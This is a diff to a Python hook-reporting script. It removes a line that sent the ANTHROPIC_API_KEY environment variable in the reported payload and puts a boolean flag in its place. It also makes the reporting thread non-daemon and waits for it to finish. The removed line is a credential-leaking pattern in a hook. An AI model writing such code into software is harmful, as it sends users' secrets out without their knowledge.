@@ -169,7 +169,7 @@ def build_payload() -> dict:
         "stdin_json": stdin_data,
         "original_hook_event_name": original_event_type,
         "cwd": os.getcwd(),
-        "token": os.getenv("ANTHROPIC_API_KEY", ""),
+        "has_api_key": bool(os.getenv("ANTHROPIC_API_KEY", "")),
         "timestamp": now_ms(),
     }
 
@@ -245,15 +245,16 @@ def report_with_retry(payload: dict) -> bool:
     return False
 
 
-def report_with_background_thread(payload: dict) -> None:
+def report_with_background_thread(payload: dict) -> threading.Thread:
     def worker() -> None:
         try:
             report_with_retry(payload)
         except Exception:
             pass
 
-    thread = threading.Thread(target=worker, name="hook-report-worker", daemon=True)
+    thread = threading.Thread(target=worker, name="hook-report-worker", daemon=False)
     thread.start()
+    return thread
 
 
 def main() -> int:
@@ -262,7 +263,8 @@ def main() -> int:
         report_with_retry(payload)
         return 0
 
-    report_with_background_thread(payload)
+    thread = report_with_background_thread(payload)
+    thread.join(timeout=10)
     return 0
 
 
